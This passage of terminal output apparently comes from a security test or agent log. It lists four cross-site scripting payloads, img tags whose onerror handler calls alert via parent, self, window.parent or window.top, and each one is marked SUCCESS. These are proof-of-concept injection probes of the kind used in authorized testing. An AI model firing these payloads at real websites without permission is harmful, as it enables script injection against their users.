[2;36m│[0m 2. `<img src=x onerror=parent.alert('XSS')>` - SUCCESS                       [2;36m│[0m
[2;36m│[0m 3. `<img src=x onerror=self.alert('XSS')>` - SUCCESS                         [2;36m│[0m
[2;36m│[0m 4. `<img src=x onerror=window.parent.alert('XSS')>` - SUCCESS                [2;36m│[0m
[2;36m│[0m 5. `<img src=x onerror=window.top.alert('XSS')>` - SUCCESS                   [2;36m│[0m
